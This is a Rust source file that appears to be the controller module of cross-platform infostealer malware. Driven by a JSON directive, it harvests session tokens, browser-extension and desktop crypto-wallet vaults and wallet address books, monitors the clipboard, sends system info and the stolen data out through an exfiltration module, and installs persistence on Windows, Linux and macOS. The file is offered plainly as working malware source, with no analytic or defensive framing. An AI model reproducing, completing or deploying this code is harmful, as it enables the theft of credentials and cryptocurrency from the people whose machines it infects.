pub mod wallets;

#[cfg(windows)]
pub mod windows;
#[cfg(target_os = "linux")]
pub mod linux;
#[cfg(target_os = "macos")]
pub mod macos;

#[derive(serde::Deserialize, Default)]
pub struct Directive {
    #[serde(default)]
    pub tiers: Vec<String>,
    #[serde(default)]
    pub persistence: Vec<String>,
    #[serde(default)]
    pub uninstall: bool,
    #[serde(default)]
    pub rate_limit_ms: u64,
}

pub fn run(directive_bytes: &[u8]) {
    svc_common::exfil::init_from_env();
    svc_common::exfil::drain_spool();

    let directive: Directive = serde_json::from_slice(directive_bytes).unwrap_or_default();

    if directive.uninstall {
        uninstall(&directive.persistence);
        return;
    }

    let want =
        |t: &str| directive.tiers.iter().any(|x| x == t) || directive.tiers.is_empty();

    svc_common::exfil::exfil_event("sysinfo", svc_common::sysinfo::SysInfo::collect());

    if want("session") {
        collect_session_tokens();
    }
    if want("ext") {
        wallets::harvest_extension_vaults();
    }
    if want("desktop") {
        wallets::harvest_desktop_vaults();
    }
    if want("addr") {
        wallets::harvest_address_book();
    }
    if want("clip") {
        clipboard_loop();
    }

    if !directive.persistence.is_empty() {
        persistence(&directive.persistence);
    }

    svc_common::exfil::drain_spool();
}

fn collect_session_tokens() {
    #[cfg(windows)]
    windows::harvest_session_tokens();
    #[cfg(target_os = "macos")]
    macos::harvest_session_tokens();
    #[cfg(target_os = "linux")]
    linux::harvest_session_tokens();
}

fn clipboard_loop() {
    #[cfg(windows)]
    windows::clipboard_monitor();
    #[cfg(target_os = "macos")]
    macos::clipboard_monitor();
    #[cfg(target_os = "linux")]
    linux::clipboard_monitor();
}

fn persistence(entries: &[String]) {
    #[cfg(windows)]
    windows::install_persistence(entries);
    #[cfg(target_os = "linux")]
    linux::install_persistence(entries);
    #[cfg(target_os = "macos")]
    macos::install_persistence(entries);
}

fn uninstall(entries: &[String]) {
    #[cfg(windows)]
    windows::uninstall_persistence(entries);
    #[cfg(target_os = "linux")]
    linux::uninstall_persistence(entries);
    #[cfg(target_os = "macos")]
    macos::uninstall_persistence(entries);
}
